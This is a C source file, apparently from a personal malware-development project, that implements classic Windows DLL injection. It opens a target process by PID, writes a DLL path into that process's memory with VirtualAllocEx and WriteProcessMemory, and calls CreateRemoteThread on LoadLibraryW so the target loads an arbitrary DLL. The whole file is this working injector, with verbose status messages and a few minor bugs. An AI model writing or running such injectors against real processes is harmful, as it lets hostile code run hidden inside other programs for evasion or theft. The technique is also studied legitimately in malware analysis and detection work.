#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[-]";
const char* e = "[*]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hkernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"F:\\Projects\\MAL_DEV projects\\randomDLL.dll";
size_t dllPathSize = sizeof(dllPath);

int main(char argc, char* argv[]) {
	if (argc < 2) {
		printf("%s usage: %s", e, argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)\n", i, PID);
	
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	

	if (hProcess == NULL) {
		printf("%s couldn't get a handle to a process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to a process! (%ld)\n\\---0x%p\n", k, PID, hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	
	printf("%s allocated buffer size to process memory w/ PAGE_READWRITE permissions\n", k);

	if (rBuffer == NULL) {
		printf("%s couldn't create rBuffer, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	} 

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
	printf("%s wrote [%s] to process memory\n", k, dllPath);

	hkernel32 = GetModuleHandleW(L"kernel32");

	if(hkernel32 == NULL) {
		printf("%s failed to get handle to kernel32.dll, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got handle to kernel32.dll\n\\---0x%p\n", k, hkernel32);

	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hkernel32, "LoadLibraryW");

	printf("%s got the address of LoadLibraryW()\n\\---0x%p\n", k, startThis);

	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &PID);
	
	if (hThread == NULL) {
		printf("%s failed to get a handle to a thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a hadle to newly-created thread (%ld)\n\\---0x%p\n", k, TID, hThread );
	printf("%s waiting for thread to finish execution\n", i);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing, cleaning up...\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("%s finished, see you next time! <3", k);
	return EXIT_SUCCESS;
}